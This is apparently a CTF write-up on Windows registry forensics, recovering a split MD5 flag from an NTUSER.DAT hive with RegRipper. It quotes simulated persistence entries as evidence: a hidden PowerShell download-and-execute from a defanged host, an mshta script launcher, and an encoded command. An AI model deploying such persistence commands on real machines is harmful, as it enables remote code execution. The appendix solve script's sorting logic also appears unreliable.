> **Platform Name**: CTF Challenge
> **Category**: #Forensics #WindowsForensics #RegistryAnalysis
> **Difficulty**: Medium
> **Date**: October 14, 2025
> **Author**: Joseph Lipinski
---
## Table of Contents
1. [Introduction](#introduction)
2. [Setup](#setup)
3. [Reconnaissance](#reconnaissance)
4. [Enumeration](#enumeration)
5. [Exploitation](#exploitation)
6. [Post-Exploitation/Flag](#post-exploitationflag)
7. [Lessons Learned](#lessons-learned)
8. [References](#references)

---
## Introduction

**Objective:**
Extract and reassemble an MD5 hash split into 8 pieces scattered throughout a Windows registry hive file. The flag format is `flag{` followed by a 32-character hexadecimal string and `}`.

**Description:**
This forensics challenge involves analyzing a Windows NTUSER.DAT registry hive file that has been compromised by a threat actor. The challenge prompt contains a clever wordplay hint: "Some threat actor sure did let it rip on this host!" - referencing both the Beyblade anime catchphrase and the forensics tool RegRipper that's needed to solve the challenge.

**Challenge Prompt:**
```
Sheesh! Some threat actor sure did let it rip on this host! We've been able to uncover a file that may help with incident response.

NOTE
The password to the ZIP archive is beyblade.
This challenge has the flag MD5 hash value separated into chunks. You must uncover all of the different pieces and put them together with the flag{ and } suffix to submit.
```

---
## Setup

- **Operating System:** macOS (or any OS with RegRipper installed)
- **Tools Used:** 
  - #RegRipper - Windows Registry parsing tool
  - Text editor or `grep` for searching output
  - Terminal for command-line operations
- **Files Provided:** 
  - `beyblade.zip` (password protected with password: `beyblade`)
  - Contains: `beyblade` (Windows registry hive file - NTUSER.DAT)

**Installation of RegRipper (if needed):**
```bash
# On Linux/macOS with Perl installed
git clone https://github.com/keydet89/RegRipper3.0.git
cd RegRipper3.0

# Or install via package manager (Kali Linux)
sudo apt-get install regripper
```

---
## Reconnaissance

### Initial File Analysis
First, we need to understand what type of file we're dealing with.

```bash
# Extract the archive
unzip beyblade.zip
# Password: beyblade

# Check file type
file beyblade
```

**Output:**
```
beyblade: MS Windows registry file, NT/2000 or above
```

**Findings:**
- The file is a Windows registry hive
- Based on the challenge context, this is likely an NTUSER.DAT hive (user registry)
- Registry hives contain persistence mechanisms, user activities, and configuration data
- Perfect target for RegRipper analysis

### Understanding the Challenge Hint
The prompt mentions "let it rip" - this is a **double entendre**:
1. Beyblade anime catchphrase
2. Reference to **RegRipper** tool (RIP = Registry Information Parser)

This strongly suggests we should use RegRipper to parse the registry hive.

---
## Enumeration

### Running RegRipper
RegRipper will parse the registry hive and extract valuable forensic artifacts using various plugins.

```bash
# Run RegRipper on the hive file
rip.pl -r beyblade -f ntuser > regripper.txt

# Alternative syntax depending on RegRipper version
regripper -r beyblade -p ntuser > regripper.txt
```

**What RegRipper Does:**
- Runs multiple plugins against the registry hive
- Extracts user activities, autostart locations, recently accessed files, URLs, and more
- Outputs human-readable text with timestamps and registry paths

### Initial Output Review
The output file (`regripper.txt`) contains 701 lines of parsed registry data. Let's search for potential flag pieces.

```bash
# Search for keywords related to the challenge
grep -i "chunk\|piece\|hash\|segment\|shard\|fragment\|component" regripper.txt
```

**Interesting Discoveries:**
We find several suspicious entries with different naming conventions:
- `hash-value-2-8_5cd4`
- `piece:4/8-b34a`
- `chunk+3of8:6d7b`
- `shard(6/8)-315a`
- `component#7of8-99bb`
- `segment-8-of-8=58de`
- `fragment-5_of_8-0d9c`
- `_value_1_of_8-47cb`

These appear to be the 8 pieces of the MD5 hash!

---
## Exploitation

### Systematic Extraction of Hash Pieces
Now we need to locate each piece systematically by searching the regripper output.

#### Piece 1 of 8
```bash
# Search for piece 1
grep -E "1/8|1of8|1_of_8|_value_1" regripper.txt
```

**Location:** Line 497 - Windows Run Registry Key
```
Software\Microsoft\Windows\CurrentVersion\Run
LastWrite Time 2025-09-27 19:16:09Z
  Windows Update Monitor - powershell -nop -w hidden -c iwr http://cdn.update-catalog[.]com/agent?v=1 -UseBasicParsing|iex ; # _value_1_of_8-47cb
```
**Extracted Value:** `47cb`
**Significance:** Found in autostart location - common persistence mechanism for malware

#### Piece 2 of 8
```bash
# Search for piece 2
grep -E "2/8|2of8|2_of_8" regripper.txt
```

**Location:** Line 506 - RunOnce Registry Key
```
Software\Microsoft\Windows\CurrentVersion\RunOnce
LastWrite Time 2025-09-27 19:16:23Z
  OneDrive Setup - cmd /c start /min mshta about:<script>location='http://telemetry.sync-live[.]net/bootstrap?stage=init&note=hash-value-2-8_5cd4'</script>
```
**Extracted Value:** `5cd4`
**Significance:** RunOnce persistence with MSHTA (Living off the Land Binary)

#### Piece 3 of 8
```bash
# Search for piece 3
grep -E "3/8|3of8|3_of_8" regripper.txt
```

**Location:** Line 607 - Internet Explorer TypedURLs
```
TypedURLs
Software\Microsoft\Internet Explorer\TypedURLs
LastWrite Time 2025-09-27 19:16:23Z
  url1 -> http://auth.live-sync[.]net/login?session=chunk+3of8:6d7b
```
**Extracted Value:** `6d7b`
**Significance:** Manually typed URL - indicates user or malware activity

#### Piece 4 of 8
```bash
# Search for piece 4
grep -E "4/8|4of8|4_of_8" regripper.txt
```

**Location:** Line 536 - RunMRU (Run dialog history)
```
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
LastWrite Time 2025-09-27 19:16:23Z
MRUList = 
r1   powershell.exe -e JABNAE0A; ## piece:4/8-b34a
```
**Extracted Value:** `b34a`
**Significance:** Run dialog history - shows PowerShell command execution

#### Piece 5 of 8
```bash
# Search for piece 5
grep -E "5/8|5of8|5_of_8" regripper.txt
```

**Location:** Line 593 - TypedPaths (Explorer address bar)
```
Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
LastWrite Time 2025-09-27 19:16:53Z

url1     C:\                           
url2     C:\Users\Public\fragment-5_of_8-0d9c
```
**Extracted Value:** `0d9c`
**Significance:** File path typed in Windows Explorer

#### Piece 6 of 8
```bash
# Search for piece 6
grep -E "6/8|6of8|6_of_8" regripper.txt
```

**Location:** Line 138 - AppCompatCache
```
2025-09-27 19:16:23Z
  wmiprvse.exe - C:\Windows\System32\wmiprvse.exe /k netsvcs -tag shard(6/8)-315a
```
**Extracted Value:** `315a`
**Significance:** Application Compatibility Cache - tracks executed programs

#### Piece 7 of 8
```bash
# Search for piece 7
grep -E "7/8|7of8|7_of_8" regripper.txt
```

**Location:** Line 398 - MUICache (Shell MUICache)
```
Software\Microsoft\Windows\ShellNoRoam\MUICache
LastWrite Time 2025-09-27 19:16:23Z
  C:\Windows\System32\mmc.exe (Microsoft Management Console - component#7of8-99bb)
```
**Extracted Value:** `99bb`
**Significance:** Shell MUICache - caches application names

#### Piece 8 of 8
```bash
# Search for piece 8
grep -E "8/8|8of8|8_of_8" regripper.txt
```

**Location:** Line 584 - Terminal Server Client
```
Software\Microsoft\Terminal Server Client\Servers
LastWrite time 2025-09-27 19:16:23Z

fileshare.local  LastWrite time: 2025-09-27 19:16:23Z
  UsernameHint: administrator|segment-8-of-8=58de
```
**Extracted Value:** `58de`
**Significance:** RDP connection history with username hints

### Complete Hash Assembly

| Piece | Value | Registry Location |
|-------|-------|-------------------|
| 1/8   | 47cb  | Run Key |
| 2/8   | 5cd4  | RunOnce Key |
| 3/8   | 6d7b  | TypedURLs |
| 4/8   | b34a  | RunMRU |
| 5/8   | 0d9c  | TypedPaths |
| 6/8   | 315a  | AppCompatCache |
| 7/8   | 99bb  | MUICache |
| 8/8   | 58de  | Terminal Server Client |

**Assembled MD5 Hash:**
```
47cb5cd46d7bb34a0d9c315a99bb58de
```

---
## Post-Exploitation/Flag

### Constructing the Final Flag
According to the challenge description, the flag format is `flag{<32-character-hex-string>}`.

```bash
# Concatenate all pieces in order
echo "47cb5cd46d7bb34a0d9c315a99bb58de"

# Verify it's 32 characters (MD5 hash length)
echo "47cb5cd46d7bb34a0d9c315a99bb58de" | wc -c
# Output: 33 (32 characters + newline)
```

> [!success] Flag
> `flag{47cb5cd46d7bb34a0d9c315a99bb58de}`

### Verification
- ✅ Flag is in correct format
- ✅ Contains exactly 32 hexadecimal characters
- ✅ All 8 pieces accounted for
- ✅ Pieces are in sequential order (1-8)

---
## Lessons Learned

### Key Takeaways

1. **Pay Attention to Challenge Hints**
   - "Let it rip" was a crucial hint pointing to RegRipper
   - Challenge creators often embed tool names in descriptions
   - Wordplay and puns are common in CTF challenges

2. **Windows Registry Forensics Locations**
   This challenge highlighted several important registry locations for incident response:
   - **`Software\Microsoft\Windows\CurrentVersion\Run`** - Primary autostart location
   - **`Software\Microsoft\Windows\CurrentVersion\RunOnce`** - One-time autostart
   - **`Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`** - Run dialog history
   - **`Software\Microsoft\Internet Explorer\TypedURLs`** - Manually typed URLs
   - **`Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths`** - Explorer address bar history
   - **AppCompatCache** - Shimcache, tracks executed programs
   - **MUICache** - Tracks applications for display names
   - **`Software\Microsoft\Terminal Server Client\Servers`** - RDP connection history

3. **RegRipper Proficiency**
   - RegRipper automates extraction of forensic artifacts from registry hives
   - Outputs organized, timestamped data
   - Essential tool for Windows forensics and incident response
   - Can process NTUSER.DAT, SYSTEM, SOFTWARE, SAM, SECURITY hives

4. **Pattern Recognition**
   - The challenge used various naming conventions for pieces:
     - `_value_1_of_8-47cb`
     - `hash-value-2-8_5cd4`
     - `chunk+3of8:6d7b`
     - `piece:4/8-b34a`
     - `fragment-5_of_8-0d9c`
     - `shard(6/8)-315a`
     - `component#7of8-99bb`
     - `segment-8-of-8=58de`
   - Using regex patterns helps find all variations: `[0-9]/8|[0-9]of8|[0-9]_of_8`

5. **Malware TTPs Observed**
   Even though this is a CTF, the artifacts simulate real malware behavior:
   - **Persistence:** Run/RunOnce keys
   - **Living off the Land:** PowerShell, MSHTA usage
   - **C2 Communication:** Suspicious URLs with defanged domains (`[.]net`)
   - **Lateral Movement:** RDP connection history
   - **Encoded Commands:** PowerShell `-e` flag (base64 encoding)

### Forensic Analysis Techniques for Future Challenges

#### Registry Hive Analysis Workflow
```bash
# 1. Identify the hive type
file <registry_hive>

# 2. Run RegRipper with appropriate profile
rip.pl -r <hive_file> -f <profile> > output.txt

# 3. Search for common IOCs
grep -iE "http|powershell|cmd|script|exec|encoded" output.txt

# 4. Check persistence locations
grep -iE "run|startup|schedule|service" output.txt

# 5. Look for file/URL artifacts
grep -iE "recent|typed|mru" output.txt
```

#### Alternative Tools to RegRipper
- **Registry Explorer (Eric Zimmerman)** - GUI-based registry viewer
- **reged** - Linux registry editor
- **hivexget** - Extract single values from hives
- **python-registry** - Python library for registry parsing

#### Grep/Search Techniques
```bash
# Case-insensitive search with multiple patterns
grep -iE "pattern1|pattern2|pattern3" file.txt

# Search with context (lines before/after)
grep -C 3 "pattern" file.txt

# Search for hexadecimal patterns
grep -E "[0-9a-f]{4}" file.txt

# Count occurrences
grep -c "pattern" file.txt

# Show line numbers
grep -n "pattern" file.txt
```

### Incident Response Applications

This challenge demonstrates how to:
1. **Identify Persistence Mechanisms** - Check Run keys for malicious autoruns
2. **Track User Activity** - TypedURLs, TypedPaths, MRU lists show user actions
3. **Detect LOLBins** - PowerShell, MSHTA, and other built-in tools used maliciously
4. **Analyze Lateral Movement** - RDP history shows compromised systems
5. **Timeline Creation** - LastWrite timestamps help build attack timelines

### Common Registry Forensic Artifacts Reference

| Artifact | Registry Location | Information Gained |
|----------|-------------------|-------------------|
| Installed Software | `SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall` | Programs installed |
| UserAssist | `NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist` | GUI programs executed |
| ShimCache | `SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache` | Program execution evidence |
| AmCache | `Windows\AppCompat\Programs\Amcache.hve` | Program execution, installation |
| BAM/DAM | `SYSTEM\CurrentControlSet\Services\bam\State\UserSettings` | Program execution with timestamps |
| Recent Docs | `NTUSER\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs` | Recently opened files |
| Network List | `SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList` | Network connections |
| USB History | `SYSTEM\CurrentControlSet\Enum\USBSTOR` | Connected USB devices |

---
## References

### Tools
- **RegRipper**: https://github.com/keydet89/RegRipper3.0
- **Registry Explorer**: https://ericzimmerman.github.io/
- **python-registry**: https://github.com/williballenthin/python-registry

### Documentation
- **Windows Registry Forensics** by Harlan Carvey
- **SANS DFIR Registry Analysis Poster**: https://www.sans.org/posters/windows-forensic-analysis/
- **13Cubed Windows Registry Forensics Videos**: https://www.youtube.com/c/13cubed

### CTF Resources
- **RegRipper Plugin Documentation**: https://github.com/keydet89/RegRipper3.0/tree/master/plugins
- **Windows Forensics Cheat Sheet**: https://www.jaiminton.com/cheatsheet/DFIR/

### Forensic Resources
- **MITRE ATT&CK**: https://attack.mitre.org/ (T1547.001 - Registry Run Keys)
- **LOLBAS Project**: https://lolbas-project.github.io/ (Living Off The Land Binaries)
- **DFIR Training**: https://www.dfir.training/

---

## Appendix: Reproduction Steps

### Quick Solve Script
For future similar challenges, here's a quick script to extract numbered pieces:

```bash
#!/bin/bash
# Extract and assemble flag pieces from regripper output

OUTPUT_FILE="regripper.txt"

echo "Searching for flag pieces..."

# Search for pieces with various patterns
grep -oE "[0-9](/|of|_of_)[0-9][-_:=][a-f0-9]{4}" "$OUTPUT_FILE" | \
  sed 's/.*[-_:=]//' | \
  sort -n | \
  tr -d '\n'

echo ""
echo "Assembled hash above"
```

### Manual Verification Checklist
- [ ] Extract ZIP with correct password
- [ ] Verify file is registry hive with `file` command
- [ ] Run RegRipper with ntuser profile
- [ ] Search for pattern indicators (piece, chunk, segment, etc.)
- [ ] Extract all 8 pieces
- [ ] Verify each piece is 4 hexadecimal characters
- [ ] Concatenate in sequential order (1-8)
- [ ] Verify final hash is 32 characters
- [ ] Submit as `flag{<hash>}`

---

**Disclaimer:** 
This write-up is for educational purposes only. The techniques described should only be used on systems you own or have explicit permission to analyze. Always obtain proper authorization before performing forensic analysis or testing on any system.

---

**Tags:** #Forensics #WindowsForensics #RegistryAnalysis #RegRipper #IncidentResponse #DFIR #CTF #Beyblade #NTUSER
